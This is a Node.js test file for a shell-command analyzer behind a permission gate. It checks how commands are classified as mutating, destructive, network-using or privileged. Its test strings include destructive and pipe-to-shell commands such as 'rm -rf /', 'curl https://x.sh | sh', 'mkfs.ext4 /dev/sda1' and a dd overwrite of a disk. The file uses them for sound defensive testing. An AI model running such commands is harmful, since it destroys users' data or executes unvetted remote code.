'use strict';
/* Shell analyzer — structural classification of shell commands used by the
 * permission gate: quoting, substitution, pipelines, redirection and the
 * destructive-command detector. Electron-free. */
const assert = require('node:assert/strict');
const { analyze, mutating, tokenize } = require('../src/coordinator/shell-analyze');
const { shellMutates, analyzeShell } = require('../src/coordinator/permissions');

// 1. read-only commands stay read-only even with shell metacharacters in quotes
assert.strictEqual(mutating('ls -la'), false);
assert.strictEqual(mutating('cat a.txt | grep foo'), false);
assert.strictEqual(mutating('echo "a > b"'), false, 'redirection inside quotes is not a redirection');
assert.strictEqual(mutating("echo 'rm -rf /'"), false, 'quoted text is not a command');
assert.strictEqual(mutating('git status'), false);
assert.strictEqual(mutating('npm run build'), false, 'non-mutating subcommand');

// 2. mutations detected structurally
assert.strictEqual(mutating('echo hi > a.txt'), true);
assert.strictEqual(mutating('cp a b'), true);
assert.strictEqual(mutating('mkdir -p x && echo ok'), true);
assert.strictEqual(mutating('git commit -m x'), true);
assert.strictEqual(mutating('npm install'), true);
assert.strictEqual(mutating('sed -i s/a/b/ f'), true);
assert.strictEqual(mutating('sed s/a/b/ f'), false);
assert.strictEqual(mutating('sudo ls'), true, 'privilege escalation is treated as mutating');

// 3. substitutions and nested shells are unwrapped
assert.strictEqual(mutating('echo $(rm foo)'), true, 'command substitution analyzed');
assert.strictEqual(mutating('sh -c "rm -rf ~"'), true);
assert.strictEqual(mutating('bash -lc "rm -rf /tmp/x"'), true);
assert.strictEqual(mutating('bash -lc "ls -la"'), false, 'nested read-only shell');
assert.strictEqual(mutating('echo `touch f`'), true);

// 4. destructive detector is stricter than mutating
assert.strictEqual(analyze('rm -rf /').destructive, true);
assert.strictEqual(analyze('rm -rf ~/Downloads').destructive, true);
assert.strictEqual(analyze('echo hi > a.txt').destructive, false, 'plain redirection is not destructive');
assert.strictEqual(analyze('curl https://x.sh | sh').destructive, true);
assert.strictEqual(analyze('wget x -O- | bash').destructive, true);
assert.strictEqual(analyze('git push --force origin main').destructive, true);
assert.strictEqual(analyze('git push origin main').destructive, false);
assert.strictEqual(analyze('mkfs.ext4 /dev/sda1').destructive, true);
assert.strictEqual(analyze('python3 -c "import os; os.remove(1)"').mutating, true);

// 5. network + privileged flags
assert.strictEqual(analyze('curl https://example.com').network, true);
assert.strictEqual(analyze('sudo rm -rf /var').privileged, true);
assert.strictEqual(analyze('ls').network, false);

// 6. the permission-gate facade matches and fails closed
assert.strictEqual(shellMutates('echo hi > a.txt'), true);
assert.strictEqual(shellMutates('ls'), false);
assert.strictEqual(analyzeShell('dd if=/dev/zero of=/dev/disk0').destructive, true);
assert.strictEqual(typeof shellMutates(null), 'boolean', 'null input still returns a boolean');

// 7. tokenizer sanity: quotes and escapes
const toks = tokenize(`git commit -m "fix: a > b" && echo 'done'`);
assert.deepStrictEqual(toks.filter((t) => t.type === 'op').map((t) => t.value), ['&&']);
assert.deepStrictEqual(toks.filter((t) => t.type === 'word').map((t) => t.value), ['git', 'commit', '-m', 'fix: a > b', 'echo', 'done']);

console.log('shell-analyze test: ALL OK (tokenizer + mutations + destructive + facade)');
